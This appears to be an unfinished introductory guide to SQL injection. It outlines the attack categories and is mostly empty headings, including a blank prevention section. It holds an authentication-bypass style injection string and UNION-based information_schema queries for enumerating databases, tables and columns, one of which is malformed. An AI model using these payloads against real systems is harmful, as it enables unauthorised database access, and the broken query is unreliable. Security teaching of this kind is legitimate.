---
layout: default
---

# Structured Query Language Injection (SQLi) essential guide

Hello people, this is an essentials guide to the introduction of SQL injection.

'"or1=1;#-->

A combination of characters and SQL logic statements can be used perform SQL injection.
There are a few main categories and sub categories of SQL injection.

* In-band SQLi
    * Union based
    * Error based
* Inferential SQLi (Blind based)
    * Boolean based
    * Time based
* Out-of-band SQLi

Where the injection happens within the program statement matters on forming an correct attack string.

## In-band SQLi

> Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database. While errors are very useful during the development phase of a web application, they should be disabled on a live site, or logged to a file with restricted access instead.

### Union based injection
### Error based injection

## Inferential SQLi (Blind)

> In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server.

### Boolean based injection
### Time based injection

## Out of band SQLi


## Enumerate Database

Get database names
```sql
SELECT schema_name FROM information_schema.schemata
UNION ALL SELECT group_concat(schema_name) FROM information_schema.schemata
```


Get table names
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = "database_name"
UNION ALL SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'
```
[Find Tables Names](https://www.sqlinjection.net/table-names/)


Get column names
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = "table_name"
SELECT group_concat(table_name, ":", column_name FROM information_schema.columns WHERE table_schema = "database_name"
UNION ALL SELECT group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'
```
[Find Column Names](https://www.sqlinjection.net/column-names/)

## Prevention

## References

* [Port Swigger SQLi](https://portswigger.net/web-security/sql-injection)
* [Imperva SQLi Categories](https://www.imperva.com/learn/application-security/sql-injection-sqli/)
* [Acunetix SQLi](https://www.acunetix.com/websitesecurity/sql-injection2/)